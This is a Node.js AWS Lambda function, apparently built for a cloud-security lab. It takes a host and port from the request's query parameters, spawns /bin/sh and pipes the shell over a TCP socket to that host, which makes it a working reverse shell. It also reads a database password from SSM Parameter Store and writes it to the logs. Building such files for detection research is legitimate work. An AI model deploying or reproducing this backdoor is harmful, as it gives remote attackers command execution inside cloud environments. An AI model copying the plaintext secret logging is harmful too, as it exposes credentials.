/* References
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
https://stackoverflow.com/a/33292942
*/
const net = require('net');
const cp = require('child_process');
const aws = require('aws-sdk');
const ssm = new aws.SSM();

module.exports.panther = async (event) => {
  writeLog(1, "Startup: The Panther is running.");

  //Read basic secret from SSM to produce normal log activity
  let secret = await getSecret();
  //NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
  //DEBUG ONLY: Make sure it found the value.
  writeLog(8, `Secret value: ${secret}`);

  let host;
  let port;

  if (event.queryStringParameters) {
    host = event.queryStringParameters.host;
    port = event.queryStringParameters.port;
  }

  if (!host || !port) {
    writeLog(2, "Invalid request: Missing host or port parameter.");
    return {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Must provide the host and port for the target TCP server as query parameters.',
      }),
    };
  }

  const portNum = parseInt(port, 10);

  const sh = cp.spawn('/bin/sh', []);
  const client = new net.Socket();

  try {
    await new Promise((resolve, reject) => {
      client.connect(portNum, host, () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
      });

      client.on('close', (hadError) => {
        if (hadError) {
          reject(new Error('Transmission error.'));
        } else {
          resolve();
        }
      });

      client.on('end', () => {
        writeLog(5, "Shutdown: The Panther is tired.");
        resolve();
      });

      client.on('error', (err) => {
        writeLog(4, err);
        reject(err);
      });

      client.on('timeout', () => {
        writeLog(3, "Timeout: Function timeout occurred.");
        reject(new Error('Socket timeout.'));
      });
    });

    writeLog(5, "Shutdown: The Panther is tired.");

    return {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  } catch (err) {
    writeLog(4, err);
    return {
      statusCode: 500,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  }
};

//Logging util
function writeLog(id, message) {
  
  var event = {
    EventId: id,
    Message: message
  };

  console.log(JSON.stringify(event));
}

//Secrets management access
async function getSecret() {
  var params = { Name: "/panther/database/password", WithDecryption: true };
  var response = await ssm.getParameter(params).promise();
  return response.Parameter.Value;
}
